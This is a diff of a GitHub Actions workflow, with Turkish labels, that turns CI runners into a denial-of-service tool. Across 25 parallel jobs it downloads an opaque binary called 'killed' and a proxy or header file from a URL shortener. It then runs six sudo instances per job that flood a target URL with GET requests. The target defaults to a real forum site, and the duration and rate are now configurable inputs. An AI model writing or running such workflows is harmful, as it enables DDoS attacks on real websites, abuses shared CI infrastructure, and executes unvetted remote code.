@@ -1,7 +1,19 @@
 name: k7
-
 on:
   workflow_dispatch:
+    inputs:
+      target:
+        description: "Hedef URL"
+        required: true
+        default: "https://www.r10.net/"
+      time:
+        description: "Süre (saniye)"
+        required: true
+        default: "115"
+      rate:
+        description: "Rate değeri"
+        required: true
+        default: "100"
 
 jobs:
   vds:
@@ -9,27 +21,33 @@ jobs:
     strategy:
       max-parallel: 25
       matrix:
-       instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
-
-
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+    
     steps:
-      - name: OK !
-        run: |
-          wget https://curl.by/RZ6co/killed
-          wget https://curl.by/PH_S-/fres.txt
-          chmod +x killed
-          PIDS=()
-          for i in {1..6}; do
-            sudo timeout 115 ./killed GET https://www.r10.net/ fres.txt 100 128 10 &
-            PIDS+=($!)
-          done
-          
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
-
-      - name: OK !
-        run: sleep 115
+    - name: Dosyaları indir ve hazırla
+      run: |
+        wget https://curl.by/MrpFL/killed
+        wget https://curl.by/v_GPh/fres.txt
+        chmod +x killed
+    
+    - name: run
+      run: |
+        TARGET="${{ inputs.target }}"
+        TIME="${{ inputs.time }}"
+        RATE="${{ inputs.rate }}"
         
-      - name: OK !
-        run: sudo reboot
+        PIDS=()
+        for i in {1..6}; do
+          sudo timeout $TIME ./killed GET "$TARGET" fres.txt "$RATE" 128 10 &
+          PIDS+=($!)
+        done
+        
+        for pid in "${PIDS[@]}"; do
+          wait $pid
+        done
+    
+    - name: Bekleme
+      run: sleep ${{ inputs.time }}
+    
+    - name: Sistemi yeniden başlat
+      run: sudo reboot
